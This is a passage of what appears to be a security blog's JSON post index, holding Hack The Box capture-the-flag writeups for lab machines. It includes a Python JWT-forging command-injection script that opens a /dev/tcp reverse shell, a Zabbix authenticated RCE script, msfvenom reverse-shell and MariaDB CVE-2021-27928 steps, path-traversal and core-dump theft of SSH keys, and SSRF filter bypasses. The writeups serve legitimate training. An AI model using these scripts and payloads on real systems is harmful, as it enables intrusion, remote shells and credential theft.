getrspn.text)[0].encode(&#39;utf-8&#39;).decode(&#39;unicode_escape&#39;) print(parse)else: print(postrspn.text)from /home/patrick/ get ssh private key for that user.PrivescInfluxDB authentication bypass vulnerabilityThere are some local services running.LISTEN 0 4096 127.0.0.1:8086 0.0.0.0:*LISTEN 0 4096 127.0.0.1:8443 0.0.0.0:*port 8086 Running InfluxDB http admin 1.7.5patrick@devzat:~$ curl -i 127.0.0.1:8086HTTP/1.1 404 Not FoundContent-Type: text/plain; charset=utf-8X-Content-Type-Options: nosniffX-Influxdb-Build: OSSX-Influxdb-Version: 1.7.5Date: Sat, 27 Nov 2021 08:58:29 GMTContent-Length: 19404 page not found InfluxDB is an open-source time series database developed by the company InfluxData. It is written in the Go programming language for storage and retrieval of time series data in fields such as operations monitoring, application metrics, Internet of Things sensor data, and real-time analytics.Found auth authentication CVE-2019-20933 from hacktricksExploit required some modules which are not available in the target box.Setup local environment for the exploit❯ ssh -L 8086:127.0.0.1:8086 -i patrick_rsa patrick@10.10.11.118❯ python3 -m venv env❯ source env/bin/activate❯ python -m pip install -r requirements.txtDefault username “admin” worked and successfully bypass authentication and from database get the bunch of usernames and passwords.wilhelm:WillyWonka2021catherine:woBeeYareedahc7Oogeephies7Aisecicharles:RoyalQueenBee$User “catherine” is in the system and his password worked with su.# ...[snip]...root 859 0.0 0.1 6812 3004 ? Ss Nov26 0:00 /usr/sbin/cron -fpatrick 861 0.0 0.1 6892 2192 ? Ss Nov26 0:00 /bin/bash /home/patrick/pets/start.sh# ...[snip]...There are 2 zip file in /var/bachup directory owned by user “catherine”unzipping both archives and running both directory against diff found only 3 file different to each other.diff main/allusers.json dev/allusers.jsondiff main/commands.go dev/commands.godiff main/devchat.go dev/devchat.go#one extra file in &quot;dev&quot;Only in dev/: testfile.txtdev/commands.go have some extra code which contains a password.diff main/ dev/# ...[snip]...&amp;gt; // Check my secure password&amp;gt; if pass != &quot;CeilingCatStillAThingIn2021?&quot; {&amp;gt; u.system(&quot;You did provide the wrong password&quot;)&amp;gt; return&amp;gt; }# ...[snip]...Found a password CeilingCatStillAThingIn2021? but not for user “root”lfiThere is a one more service running on localhost, this port is running same app “devzat” but slightly different.“devzat” one that is running on localhost is a dev version which have one extra command /filediff command already got that command source codefunc fileCommand(u *user, args []string) { if len(args) &amp;lt; 1 { u.system(&quot;Please provide file to print and the password&quot;) return } if len(args) &amp;lt; 2 { u.system(&quot;You need to provide the correct password to use this function&quot;) return } path := args[0] pass := args[1] // Check my secure password if pass != &quot;CeilingCatStillAThingIn2021?&quot; { u.system(&quot;You did provide the wrong password&quot;) return } // Get CWD cwd, err := os.Getwd() if err != nil { u.system(err.Error()) } // Construct path to print printPath := filepath.Join(cwd, path) // Check if file exists if _, err := os.Stat(printPath); err == nil { // exists, print file, err := os.Open(printPath) if err != nil { u.system(fmt.Sprintf(&quot;Something went wrong opening the file: %+v&quot;, err.Error())) return } defer file.Close() scanner := bufio.NewScanner(file) for scanner.Scan() { u.system(scanner.Text()) } if err := scanner.Err(); err != nil { u.system(fmt.Sprintf(&quot;Something went wrong printing the file: %+v&quot;, err.Error())) } return } else if os.IsNotExist(err) { // does not exist, print error u.system(fmt.Sprintf(&quot;The requested file @ %+v does not exist!&quot;, printPath)) return } // bokred? u.system(&quot;Something went badly wrong.&quot;)}func clearCommand(u *user, _ []string) { u.term.Write([]byte(&quot;\\033[H\\033[2J&quot;))}This source code shows that this command takes 2 arguments “file path” and “password” and there is no sanitization in the input. Another thing is that file path construct with 2 fields application’s working directory + user input file path. // Get CWD cwd, err := os.Getwd() if err != nil { u.system(err.Error()) } // Construct path to print printPath := filepath.Join(cwd, path)And application’s working directory is /root/devzat/dev: /file test CeilingCatStillAThingIn2021?[SYSTEM] The requested file @ /root/devzat/test does not exist!this is kind of a lfi bug where ../ lead to file inclusion./file ../.ssh/id_rsa CeilingCatStillAThingIn2021?" }, { "title": "Hackthebox - Secret", "url": "/posts/secret/", "categories": "hackthebox, linux", "tags": "command injection, coredump", "date": "2021-11-25 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.11.120 secret.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)| 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)|_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: DUMB Docs3000/tcp open http Node.js (Express middleware)|_http-title: DUMB DocsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel webserver on port 80 is running a express javascript webapp and source code of this app available in the home page. both port are running same webapp and as of now don’t see any difference them. FootholdWebapp source code reviewDownload the source code and audit them. The easiest way to audit node application is, Go to app directory and run npm audit and it will show if there is any out-dated or vulnerable dependency used in the application.And right of the bat we found a high/critical Severity vulnerability in dependency that is used in this application. But none of these vulnerability are useful in this scenario. Moving on and reviewing source code.After testing and reviewing source code Application have API based Authentication. This Authentication system uses jwt token. in the zip file, there is a .env that contains that jwt token secret key. Then there is a .git directory in the zip file Viewing the git log found there are some commits related to .evn file reverting git commit back to 2 commits and got the secret token from .env file.Command injection From Source code ./local-web/routes/private.js have route /log which is vulnerable for command injection. And finally, This lead to command injection by creating jwt token with admin’s username from /log endpoint.Reverse shell scriptimport jsonimport jwtimport reimport requests as rimport sysip = &#39;10.10.14.42&#39;port = 4141secret = &#39;gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE&#39;token = {&quot;auth-token&quot;: jwt.encode({&quot;name&quot;: &quot;theadmin&quot;, &quot;email&quot;: &quot;admin@admin.com&quot;}, secret, algorithm=&quot;HS256&quot;)}injection = f&#39;%2Fbin%2Fbash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F{ip}%2F{port}+0%3E%261%22&#39; #sys.argv[1]rspn = r.get(f&#39;http://10.10.11.120:3000/api/logs?file=command;{injection}&#39;, headers=token)try: data = json.loads(rspn.text) print(data[&quot;signal&quot;])except json.JSONDecodeError: print(rspn.text)except TypeError as e: print(re.findall(r&#39;&quot;(.*?)&quot;&#39;, rspn.text)[0].encode(&#39;utf-8&#39;).decode(&#39;unicode_escape&#39;))PrivescCore dumpThere is a suid binary in /opt directory. This binary counts the words/directory from given path. binary source code also available in the same directory in code.c file.Read thorough the code, in the main function after reading the file, function is enabling coredump with “PR_SET_DUMPABLE”.coredump in suid above binary is a suid binary and Linux disables core dumps for setuid programs. The memory of a setuid program might (is likely to, even) contain confidential data. For enabling coredump in suid binary Enable setuid core dumps in general by setting the fs.suid_dumpable sysctl to 2, e.g. with echo 2 &amp;gt;/proc/sys/fs/suid_dumpable. (Note: 2, not 1; 1 means “I’m debugging the system as a whole and want to remove all security”.) Call prctl(PR_SET_DUMPABLE, 1) from the program. And final, To dump core memory in a file the “core file size” limit is set to more than 0 or unlimited. this can be set with ulimit command with -c flag.;source of this informationAlready see that binary is using PR_SET_DUMPABLE to enable coredump and other 2 this are also set as they should be.cat /proc/sys/fs/suid_dumpableulimit -ccoredump misconfigureNow to next thing is, this binary is is dropping user privileges before setting coredump. If binary is owned by root but dropped his privilege while executing before calling coredump. This cause dumped file owned by that low privilege user.I done the 2 tests in my test environment and check if core file dropped the permissions if binary dropped his permission before enabling coredump.force coredumpNext this is to force binary to dumped core memory.In normal case, if we kill or ctrl+c binary, it might exit quietly without any error and there for no core memory to dump.But in the kill command there are some signals that caused a binary to drop core memory. check signal man page ;source of this informationThese signals with default action ‘core’ cause a process to terminate and produce a core dump file.and in the above test i used SIGSEGV Invalid memory reference signal to cause coredump.coredump with apportNow the core file can be configured, how it will be stored with /proc/sys/kernel/core_patternin the target box, dump file configure with apport(remote) dasith@secret:/var/crash$ cat /proc/sys/kernel/core_pattern|/usr/share/apport/apport %p %s %c %d %P %Efrom apport wiki: https://wiki.ubuntu.com/Apportapport is a ubuntu specific utility and it intercepts Program crashes, collects debugging information about the crash and the operating system environment, and sends it to bug trackers in a standardized form.now saving crash file with apport:If any process in the system dies due to a signal that is commonly referred to as a ‘crash’ (segmentation violation, bus error, floating point exception, etc.), or e.g. a packaged Python application raises an uncaught exception, the apport backend is automatically invoked. It produces an initial crash report in a file in /var/crash/ (the file name is composed from the name of the crashed executable and the user id).That means in target box we can find the coredump in /var/crash/ in the binary’s crash report.but how this is helpful in privilege escalation.Reading coredumpThere are multiple options for read/debug coredump.for normal core file we can use gdbgdb ./executable core(gdb) bt #view the backtracefor apport crash report, use apport-unpack utility.apport-unpack /var/crash/binary.crash unpackPathcd unpackpath/gdb ./executable CoreDump(gdb) bt #view the backtracewe can directly read the coredump file with objdumpobjdump -s coreor open with strings command to display readable text from the core file.coredump knows your secrethere is the thing with coredump file that This file contains the memory, register values, and the call stack of an application at the point of crashing.and our target binary have root level access in the filesystem because of the suid ability and binary have filecount function which reads the file we specified.and if we cause coredump before binary exit. coredump must have the content of that file in the crash logs. box have tmux and all required tools, run tmux to get multiple terminals in the same sessions.And doing strings on CoreDump file get the content of the ssh private key fileMoving on the same direction, There is a RCE with this flaw. https://schulz.dk/2021/10/25/using-core-dumps-for-linux-privacy-escalation/ https://alephsecurity.com/2021/10/20/sudump/" }, { "title": "Hackthebox - Shibboleth", "url": "/posts/shibboleth/", "categories": "hackthebox, linux", "tags": "ipmi, zabbix 5.0.17, rce, mysql wsrep_provider, command injection, mariadb 10.3.25, cve-2021-27928", "date": "2021-11-23 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.11.124 shibboleth.htbnmap scan:#TCPPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.41|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http://shibboleth.htb/Service Info: Host: shibboleth.htb#UDPPORT STATE SERVICE VERSION623/tcp closed oob-ws-http623/udp open asf-rmcp1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port623-UDP:V=7.91SVN%I=7%D=11/23%Time=619CD6CF%P=x86_64-unknown-linux-SF:gnu%r(ipmi-rmcp,1E,&quot;\\x06\\0\\xff\\x07\\0\\0\\0\\0\\0\\0\\0\\0\\0\\x10\\x81\\x1cc\\x20\\xSF:008\\0\\x01\\x97\\x04\\x03\\0\\0\\0\\0\\t&quot;); webserver redirect to http://shibboleth.htb/ Running nmap udp scan found port 623 and nmap fingerprint show ipmi-rmcp.Web have nothing interestingffuf Subdomain scan, found multiple subdomain❯ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H &quot;Host: FUZZ.shibboleth.htb&quot; -u http://10.10.11.124 -ac -t 100# ... [snip] ...monitor [Status: 200, Size: 3686, Words: 192, Lines: 30, Duration: 5532ms]monitoring [Status: 200, Size: 3686, Words: 192, Lines: 30, Duration: 334ms]zabbix [Status: 200, Size: 3686, Words: 192, Lines: 30, Duration: 339ms]all subdomain lead to zabbix login pageFootholdipmiThe Intelligent Platform Management Interface is a set of computer interface specifications for an autonomous computer subsystem that provides management and monitoring capabilities independently of the host system’s CPU, firmware and operating system. Good blog on ipmi pentesting: https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/There is a vulnerability in ipmiPORT STATE SERVICE623/udp open asf-rmcp| ipmi-cipher-zero: | VULNERABLE:| IPMI 2.0 RAKP Cipher Zero Authentication Bypass| State: VULNERABLE| Risk factor: High| | The issue is due to the vendor shipping their devices with the| cipher suite &#39;0&#39; (aka &#39;cipher zero&#39;) enabled. This allows a| remote attacker to authenticate to the IPMI interface using| an arbitrary password. The only information required is a valid| account, but most vendors ship with a default &#39;admin&#39; account.| This would allow an attacker to have full control over the IPMI| functionality| | References:| https://www.us-cert.gov/ncas/alerts/TA13-207A|_ http://fish2.com/ipmi/cipherzero.htmlThere’s also a metasploit module for dumping password hashes using this vulnerability: https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/Dump some password hashmsf6 &amp;gt; use auxiliary/scanner/ipmi/ipmi_dumphashesmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &amp;gt; set RHOSTS 10.10.11.124RHOSTS =&amp;gt; 10.10.11.124msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &amp;gt; set OUTPUT_hASHCAT_FILE hash.catOUTPUT_hASHCAT_FILE =&amp;gt; hash.catmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &amp;gt; run[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:763fdea402871f00d8c34ccbdd521760dbff76f5a0c8fc1c74de67248e196135d83dfafd88d840a3a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:6016af14efa2712414fb09c26675de2e7c2ccb20[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completeddumped hashes output in the hash.cat file and directly load in hashcat❯ hashcat --username -m 7300 hash.cat /usr/share/wordlists/rockyou.txt --show10.10.11.124 Administrator:763fdea402871f00d8c34ccbdd521760dbff76f5a0c8fc1c74de67248e196135d83dfafd88d840a3a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:6016af14efa2712414fb09c26675de2e7c2ccb20:ilovepumkinpie1Creds: Administrator:ilovepumkinpie1And successfully logged in to zabbix(zabbix.shibboleth.htb) with found creds.zabbixZabbix is an open-source monitoring software tool for diverse IT components, including networks, servers, virtual machines and cloud services. Zabbix provides monitoring metrics, among others network utilization, CPU load and disk space consumption. zabbix version is 5.0.17I tried to install zabbix-cli tool and run it but the zabbix api is Forbidden and return 403.I Found a stackoverflow answer about executing system commands from zabbix agent.Creating new item in running hostCreate new item and set payload in key option and click on “test” and then “get value and test” to execute command immediatelyHere is a simple python script to automate this process#!/usr/bin/python3&quot;&quot;&quot;Application: zabbix 5.0.17Description: zabbix authenticated RCE through &quot;system.run[]&quot;&quot;&quot;&quot;import reimport sysimport requests as rimport json# print(&quot;/** Author: x00tex **/&quot;)url = &#39;http://zabbix.shibboleth.htb&#39;username = &#39;Administrator&#39;password = &#39;ilovepumkinpie1&#39;s = r.session()login = s.post(f&#39;{url}/index.php&#39;, data={&quot;name&quot;: username, &quot;password&quot;: password, &quot;autologin&quot;: 1, &quot;enter&quot;: &quot;Sign in&quot;})class Get_host: def __init__(self): rspn = s.get(f&#39;{url}/hosts.php&#39;) self.hostid = re.findall(r&#39;hostid=(.*?)&quot;&amp;gt;(.*?)&amp;lt;/a&amp;gt;&#39;, rspn.text) self.sid = re.findall(r&#39;sid=(.*?)\\&#39;&#39;, rspn.text)def get_values(): return Get_host()t = get_values()print(&quot;[+] All Hosts&quot;)for i in t.hostid: print(f&quot;{i[1]}:{i[0]}&quot;)def exploit(payload): data = {&quot;key&quot;: f&quot;system.run[{payload}]&quot;, &quot;delay&quot;: &quot;&quot;, &quot;value_type&quot;: 3, &quot;item_type&quot;: 0, &quot;itemid&quot;: 0, &quot;interfaceid&quot;: 0, &quot;get_value&quot;: 1, &quot;interface[address]&quot;: &quot;127.0.0.1&quot;, &quot;interface[port]&quot;: 10050, &quot;proxy_hostid&quot;: 0, &quot;show_final_result&quot;: 1, &quot;test_type&quot;: 0, &quot;hostid&quot;: t.hostid[0][0], &quot;valuemapid&quot;: 0, &quot;value&quot;: &quot;&quot;} rce = s.post(f&#39;{url}/zabbix.php?sid={t.sid[0]}&amp;amp;action=popup.itemtest.send&#39;, data=data) return rce.textpayload = sys.argv[1]output = json.loads((exploit(payload)))print(&#39;[+] Payload output&#39;)if &quot;value&quot; in output: print(output[&quot;value&quot;])else: print(output)s.close()Exploit in action❯ python exploit.py &#39;id&#39;/** Author: x00tex(poorduck) **/[+] All Hostsshibboleth.htb:10084[+] Payload outputuid=110(zabbix) gid=118(zabbix) groups=118(zabbix)There is a problem when i try to get reverse shell on the box, the shell dies immediately. If we read through the zabbix agent docs in “system.run” they specify 2 modes and default mode is “wait” which wait for the command output and display the output and “nowait” just execute and return 1 if command executes and 0 if not and move on.PrivescGet reverse shell as user “zabbix” and zabbix dashboard password reused for system user “ipmi-svc”(remote) zabbix@shibboleth:/tmp$ iduid=110(zabbix) gid=118(zabbix) groups=118(zabbix)(remote) zabbix@shibboleth:/tmp$ su ipmi-svcPassword: ipmi-svc@shibboleth:/tmp$There is a mysql server in the localhostipmi-svc@shibboleth:~$ ss -lntp | grep 127LISTEN 0 869 127.0.0.1:3306 0.0.0.0:*linpeas show zabbix config file is readable by “ipmi-svc”╔══════════╣ Readable files belonging to root and readable by me but not world readable-rw-r----- 1 root ipmi-svc 22306 Oct 18 09:24 /etc/zabbix/zabbix_server.conf.dpkg-dist-rw-r----- 1 root ipmi-svc 21863 Apr 24 2021 /etc/zabbix/zabbix_server.confRead through the config file found database passwordipmi-svc@shibboleth:~$ cat /etc/zabbix/zabbix_server.conf | grep -v &#39;#&#39; | grep -E &#39;DB*&#39;DBName=zabbixDBUser=zabbixDBPassword=bloooarskybluhmysql ‘wsrep_provider’ OS Command ExecutionGot some password hashes from “zabbix” databaseMariaDB [zabbix]&amp;gt; select alias,passwd from users;+---------------+--------------------------------------------------------------+| alias | passwd |+---------------+--------------------------------------------------------------+| Admin | $2y$10$L9tjKByfruByB.BaTQJz/epcbDQta4uRM/KySxSZTwZkMGuKTPPT2 || guest | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 || Administrator | $2y$10$FhkN5OCLQjs3d6C.KtQgdeCc485jKBWPW4igFVEgtIP3jneaN7GQe |+---------------+--------------------------------------------------------------+“Administrator” user password we already have and other 2 hashes are not crackable.Viewing the database versionMariaDB [(none)]&amp;gt; SELECT VERSION();+----------------------------------+| VERSION() |+----------------------------------+| 10.3.25-MariaDB-0ubuntu0.20.04.1 |+----------------------------------+1 row in set (0.000 sec)There is a OS Command Execution vulnerability in MariaDB 10.2 before 10.2.37, 10.3 before 10.3.28, 10.4 before 10.4.18, and 10.5 before 10.5.9 CVE-2021-27928:https://www.exploit-db.com/exploits/49765Follow the PoC Create the reverse shell payload msfvenom -p linux/x64/shell_reverse_tcp LHOST=&amp;lt;ip&amp;gt; LPORT=&amp;lt;port&amp;gt; -f elf-so -o CVE-2021-27928.so Start a listener nc -lvp &amp;lt;port&amp;gt; Copy the payload to the target machine Execute the payload mysql -u zabbix -pbloooarskybluh -e &#39;SET GLOBAL wsrep_provider=&quot;/tmp/CVE-2021-27928.so&quot;;&#39; " }, { "title": "Hackthebox - Backdoor", "url": "/posts/backdoor/", "categories": "hackthebox, linux", "tags": "wp-plugin, ebook download 1.1, lfi, rfi, suid screen, cve-2017-5618, proc directory", "date": "2021-11-21 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.11.125 backdoor.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)| 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)|_ 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-generator: WordPress 5.8.1| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Backdoor &amp;amp;#8211; Real-LifeService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWeb server is running wordpress.with wpscan, collected some information. : WordPress version 5.8.1 identified [i] User(s) Identified: adminWP-Plugin:eBook Download 1.1 - LFI/RFIManually go through wp common directories /wp-content and /wp-includes /wp-includes allowed indexing but nothing interesting there. /wp-contentis not indexing but /wp-content/plugins directory is allowed indexingthere is a plugin in plugins directory❯ searchsploit wordpress ebook download----------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path----------------------------------------------------------------------------------- ---------------------------------WordPress Plugin eBook Download 1.1 - Directory Traversal | php/webapps/39575.txt----------------------------------------------------------------------------------- ---------------------------------And right off the bat found Directory Traversal vulnerability in WordPress Plugin eBook Download 1.1 from searchsploit.its simply allowed file inclusion from /wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.phpwith lfi, get the wp-config.php file and db creds: wordpressuser:MQYBJSaD#DxG6qbm.Don’t get anything interestingMoving on to port 1337 but not able to identify the service.identifying services with /procwe have lfi that means we can read system file and use this ability and try to find the port 1337 service.in linux everything is file even a running process and we can read every process from /proc; Source: proc man page/proc : The proc filesystem is a pseudo-filesystem which provides an interface to kernel data structures./proc/[pid] : subdirectories Each one of these subdirectories contains files and subdirectories exposing information about the process with the corresponding process ID./proc/[pid]/cmdline : This read-only file holds the complete command line for the process.I use burp intruder to brute force pid to find the process.For current boot, the PID for service that running on port 1337 in 862/bin/sh -c while true;do su user -c &quot;cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;&quot;; doneGDBserver Remote Payload ExecutionPort 1337 is running gdbserver. We can connect to this service with gdb.There is a very old (2013) technique on gdbserver to RCE from jbremer.orgTo make this easy there is a metasploit module based on this exploit.Running msf module and get shell on the boxPrivescsuid: screenRunning find command for setuip binary on the box and found /usr/bin/screen with setuip bit permission.And screen version Screen version 4.08.00 (GNU) 05-Feb-20There is a CVE-2017-5618 in GNU screen before 4.5.1 allows local users to modify arbitrary files and consequently gain root privileges by leveraging improper checking of log file permissions.Found exploit: https://github.com/XiphosResearch/exploits/tree/master/screen2rootBut looks like this version of screen is not vulnerable for this exploit.Another thing we can check is screen sessions with screen -ls &amp;lt;username&amp;gt;/(remote) user@Backdoor:/etc$ screen -ls user/No Sockets found in /run/screen/S-user.And because screen command have suid permission we can also view root user sessions.(remote) user@Backdoor:/etc$ screen -ls root/There is a suitable screen on: 53053.root (11/22/21 07:35:40) (Multi, detached)1 Socket in /run/screen/S-root.And there is one session active named root. We can access it with screen -x &amp;lt;username&amp;gt;/&amp;lt;session-name&amp;gt;screen -x root/root" }, { "title": "Hackthebox - Forge", "url": "/posts/forge/", "categories": "hackthebox, linux", "tags": "ssrf, python pdb module", "date": "2021-10-07 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.11.111 forge.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)| 256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)|_ 256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http://forge.htbService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelhttp server redirect to: forge.htbWebapp have only file upload functionalityThere are 2 options for file uploading. Local file from filesystem. Remote file form a url.And uploaded file are stored in the /uploads/ directory with random file name without any file extension. Only images get renders and all other file renders as plain text.FootholdSSRFfile upload from remote url looks interesting. There is a hidden parameter remote in url-file-upload post request contains value 1. server fetching urls with python requests module, get form nc listener. curl -s -X &#39;POST&#39; --data-binary &#39;url=http://127.1:21/&amp;amp;remote=1&#39; &#39;http://forge.htb/upload&#39; localhost is blacklisted but can be bypassed with 127.1 and this can lead to SSRF(?). for bad urls server through errors and that way we can do port scan on local host. hostname forge.htb is also blocked but can be bypassed by using uppercase character: FORGE.htbRunning Intruder to bruteforce port and found ftp server port 21.❯ curl -s -X &#39;POST&#39; --data-binary &#39;url=http://127.1:21&amp;amp;remote=1&#39; &#39;http://forge.htb/upload&#39; | grep &#39;&amp;lt;strong&amp;gt;&#39;&amp;lt;strong&amp;gt;An error occured! Error : (&#39;Connection aborted.&#39;, BadStatusLine(&quot;220 Forge&#39;s internal ftp server\\r\\n&quot;))&amp;lt;/strong&amp;gt;but ftp:// protocol is not allowed from url parameter.❯ curl -s -X &#39;POST&#39; --data-binary &#39;url=ftp://127.1:21&amp;amp;remote=1&#39; &#39;http://forge.htb/upload&#39; | grep &#39;&amp;lt;strong&amp;gt;&#39;&amp;lt;strong&amp;gt;Invalid protocol! Supported protocols: http, https&amp;lt;/strong&amp;gt;still nothing can do with information.Fuzzing for subdomain, found admin.forge.htb.❯ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -H &quot;Host: FUZZ.forge.htb&quot; -u http://10.10.11.111 -ac -v -c# ... [snip] ...[Status: 200, Size: 27, Words: 4, Lines: 2, Duration: 617ms]| URL | http://10.10.11.111 * FUZZ: adminBut admin only accessible from localhost❯ curl -s http://admin.forge.htbOnly localhost is allowed!But we can access it with ssrf from url parameter in /upload and view response from uploaded file in /uploads/ directory.Little python script to automate file upload and read.import reimport sysimport htmlimport requests as rurl = &#39;http://forge.htb/upload&#39;def ssrf(ssrf_url): data = {&#39;url&#39;: f&#39;http://{ssrf_url}&#39;, &#39;remote&#39;: 1} rspn = r.post(url, data=data) if &#39;File uploaded successfully&#39; in rspn.text: ssrf_rspn_file = re.findall(r&#39;href=&quot;(.*?)&quot;&#39;, rspn.text)[4] ssrf_rspn = r.get(ssrf_rspn_file) print(ssrf_rspn.text) else: error = re.findall(r&#39;&amp;lt;strong&amp;gt;(.*?)&amp;lt;/strong&amp;gt;&#39;, rspn.text)[0] print(html.unescape(error))ssrf(&#39;127.0.0.1&#39;)# ssrf(sys.argv[1])With ssrf we Get access to admin panel.❯ python ssrf.py admin.FORGE.htb&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Admin Portal&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt; &amp;lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/main.css&quot;&amp;gt; &amp;lt;header&amp;gt; &amp;lt;nav&amp;gt; &amp;lt;h1 class=&quot;&quot;&amp;gt;&amp;lt;a href=&quot;/&quot;&amp;gt;Portal home&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;h1 class=&quot;align-right margin-right&quot;&amp;gt;&amp;lt;a href=&quot;/announcements&quot;&amp;gt;Announcements&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;h1 class=&quot;align-right&quot;&amp;gt;&amp;lt;a href=&quot;/upload&quot;&amp;gt;Upload image&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;/nav&amp;gt; &amp;lt;/header&amp;gt; &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; &amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;Welcome Admins!&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;There are 2 endpoints in admin subdomain /announcements and /upload.Got some interesting information from /announcements.❯ python ssrf.py &#39;admin.FORGE.htb/announcements&#39;&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Announcements&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt; &amp;lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/main.css&quot;&amp;gt; &amp;lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/announcements.css&quot;&amp;gt; &amp;lt;header&amp;gt; &amp;lt;nav&amp;gt; &amp;lt;h1 class=&quot;&quot;&amp;gt;&amp;lt;a href=&quot;/&quot;&amp;gt;Portal home&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;h1 class=&quot;align-right margin-right&quot;&amp;gt;&amp;lt;a href=&quot;/announcements&quot;&amp;gt;Announcements&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;h1 class=&quot;align-right&quot;&amp;gt;&amp;lt;a href=&quot;/upload&quot;&amp;gt;Upload image&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;/nav&amp;gt; &amp;lt;/header&amp;gt; &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; &amp;lt;ul&amp;gt; &amp;lt;li&amp;gt;An internal ftp server has been setup with credentials as user:heightofsecurity123!&amp;lt;/li&amp;gt; &amp;lt;li&amp;gt;The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.&amp;lt;/li&amp;gt; &amp;lt;li&amp;gt;The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&amp;amp;lt;url&amp;amp;gt;.&amp;lt;/li&amp;gt; &amp;lt;/ul&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt; Ftp creds: user:heightofsecurity123! admin /upload allows ftp protocol. and file upload from admin /upload can be done with /upload?u=&amp;lt;url&amp;gt;So we can now access to ftp server from admin /upload endpoint with 